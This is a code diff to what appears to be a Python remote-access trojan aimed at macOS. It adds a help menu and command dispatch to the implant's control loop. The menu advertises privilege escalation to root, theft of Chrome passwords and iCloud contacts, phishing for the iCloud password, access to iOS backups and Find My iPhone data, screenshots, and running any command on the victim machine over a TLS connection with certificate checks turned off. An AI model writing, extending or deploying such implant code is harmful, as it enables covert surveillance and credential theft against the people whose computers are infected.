@@ -201,6 +201,26 @@ def get_model():
     return model.split("= ")[1]
 
 
+def get_help():
+    help = ""
+    help += "help              -  Show this help menu.\n"
+    help += "status            -  Show debug information.\n"
+    help += "clients           -  Show a list of clients.\n"
+    help += "connect <ID>      -  Connect to the client.\n"
+    help += "get_info          -  Show basic information about the client.\n"
+    help += "get_root          -  Attempt to get root via local privilege escalation.\n"
+    help += "chrome_passwords  -  Retrieve Chrome passwords.\n"
+    help += "icloud_contacts   -  Retrieve iCloud contacts.\n"
+    help += "icloud_phish      -  Attempt to get iCloud password via phishing.\n"
+    help += "itunes_backups    -  Show the user's local iOS backups.\n"
+    help += "find_my_iphone    -  Retrieve find my iphone devices.\n"
+    help += "screenshot        -  Takes a screenshot of the client.\n"
+    help += "kill_client       -  Brutally kill the client (removes the server).\n"
+    help += "exit              -  Exits the session."
+    help += "Any other command will be executed on the connected client."
+    return help
+
+
 def send_response(server_socket, message):
     # Prefix each message with a 4-byte length (network byte order)
     prefixed_message = struct.pack('>I', len(message)) + message
@@ -311,7 +331,7 @@ def start_server():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.settimeout(None)
 
-        server_socket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)
+        server_socket = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_NONE)
 
         try:
             print MESSAGE_INFO + "Connecting..."
@@ -336,7 +356,9 @@ def start_server():
 
             print MESSAGE_INFO + "Received command: " + command
 
-            if command == "get_computer_name":
+            if command == "help":
+                send_response(server_socket, get_help())
+            elif command == "get_computer_name":
                 send_response(server_socket, get_computer_name())
             elif command == "get_shell_info":
                 shell_info = execute_command("whoami") + "\n" + get_computer_name() + "\n" + execute_command("pwd")
@@ -359,7 +381,7 @@ def start_server():
                 if "On" in filevault:
                     response += MESSAGE_ATTENTION + "FileVault is on.\n"
                 else:
-                    response += MESSAGE_INFO + "FileVault is off.\n"
+                    response += MESSAGE_INFO + "FileVault is off."
 
                 send_response(server_socket, response)
             elif command == "chrome_passwords":
@@ -463,7 +485,7 @@ def start_server():
                     try:
                         os.chdir(command[3:])
                         send_response(server_socket, "EMPTY")
-                    except OSError:
+                    except Exception:
                         send_response(server_socket, "EMPTY")
                         pass
                 else:
